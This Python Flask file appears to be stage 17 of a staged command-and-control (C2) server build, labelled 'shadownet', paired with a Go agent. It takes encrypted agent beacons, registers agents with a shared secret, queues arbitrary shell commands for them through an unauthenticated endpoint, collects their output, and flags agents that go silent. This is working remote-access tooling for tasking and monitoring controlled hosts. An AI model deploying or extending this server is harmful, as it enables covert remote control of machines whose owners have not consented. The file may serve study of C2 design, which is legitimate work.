"""
SERVER — Stage 17 (Supervisor / Crash Recovery Awareness)

Matches: agent/stages/stage17_supervisor.go

What this adds:
- Server detects when agent stops beaconing (offline detection)
- Background thread marks agents offline after HEARTBEAT_TIMEOUT
- Registration secret required for new agents
- /health endpoint
"""

import base64, json, os, uuid, sqlite3, threading, time
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime

app = Flask(__name__)

SECRET_KEY          = b"01234567890123456789012345678901"
REGISTRATION_SECRET = "shadownet-secret"
HEARTBEAT_TIMEOUT   = 30   # seconds
DB_FILE             = "stage17.db"

# ── Crypto ─────────────────────────────────────────────────────

def encrypt(data):
    aes = AESGCM(SECRET_KEY); nonce = os.urandom(12)
    return base64.b64encode(nonce + aes.encrypt(nonce, json.dumps(data).encode(), None)).decode()

def decrypt(enc):
    raw = base64.b64decode(enc)
    return json.loads(AESGCM(SECRET_KEY).decrypt(raw[:12], raw[12:], None).decode())

# ── Database ────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute('''CREATE TABLE IF NOT EXISTS agents (
        agent_id TEXT PRIMARY KEY, hostname TEXT, status TEXT, last_seen REAL)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS tasks (
        task_id TEXT PRIMARY KEY, agent_id TEXT,
        command TEXT, status TEXT, output TEXT, created_at TEXT)''')
    conn.commit(); conn.close()

# ── Offline detection background thread ─────────────────────────

def heartbeat_monitor():
    while True:
        now  = time.time()
        conn = sqlite3.connect(DB_FILE)
        rows = conn.execute("SELECT agent_id, last_seen, status FROM agents").fetchall()
        for agent_id, last_seen, status in rows:
            if last_seen and now - last_seen > HEARTBEAT_TIMEOUT and status != "offline":
                conn.execute("UPDATE agents SET status='offline' WHERE agent_id=?", (agent_id,))
                print(f"[!] Agent {agent_id} went OFFLINE")
        conn.commit(); conn.close()
        time.sleep(5)

# ── Routes ─────────────────────────────────────────────────────

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent_id")
    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    conn = sqlite3.connect(DB_FILE)
    row  = conn.execute("SELECT 1 FROM agents WHERE agent_id=?", (agent_id,)).fetchone()

    if not row:
        # New agent — check registration secret
        if payload.get("registration_secret") != REGISTRATION_SECRET:
            conn.close()
            return jsonify({"error": "unauthorized"}), 403
        conn.execute("INSERT INTO agents VALUES (?,?,?,?)",
                     (agent_id, payload.get("hostname", "?"), "online", time.time()))
        print(f"[+] New agent registered: {agent_id}")
    else:
        conn.execute("UPDATE agents SET status='online', last_seen=? WHERE agent_id=?",
                     (time.time(), agent_id))

    # ACK handling
    if payload.get("ack"):
        conn.execute("UPDATE tasks SET status='ack' WHERE task_id=?", (payload["ack"],))

    # Output handling
    if payload.get("output") and payload.get("task_id"):
        conn.execute("UPDATE tasks SET status='completed', output=? WHERE task_id=?",
                     (payload["output"], payload["task_id"]))
        print(f"\n[OUTPUT task={payload['task_id']}]\n{payload['output']}\n{'='*40}")

    # Next task
    row = conn.execute(
        "SELECT task_id, command FROM tasks WHERE agent_id=? AND status='queued' LIMIT 1",
        (agent_id,)).fetchone()
    task = None
    if row:
        task = {"id": row[0], "cmd": row[1]}
        conn.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (row[0],))

    conn.commit(); conn.close()
    return jsonify({"data": encrypt({"task": task})})

@app.route("/command", methods=["POST"])
def queue_command():
    data = request.get_json()
    tid  = str(uuid.uuid4())
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO tasks VALUES (?,?,?,'queued',?,?)",
                 (tid, data["agent_id"], data["cmd"], None,
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit(); conn.close()
    return jsonify({"task_id": tid})

@app.route("/agents")
def list_agents():
    conn = sqlite3.connect(DB_FILE)
    rows = conn.execute("SELECT agent_id, hostname, status, last_seen FROM agents").fetchall()
    conn.close()
    return jsonify([{"agent_id": r[0], "hostname": r[1],
                     "status": r[2], "last_seen": r[3]} for r in rows])

init_db()
threading.Thread(target=heartbeat_monitor, daemon=True).start()

if __name__ == "__main__":
    print(f"[*] Stage 17 server started — offline detection (timeout={HEARTBEAT_TIMEOUT}s)")
    app.run(host="0.0.0.0", port=8080, debug=False)
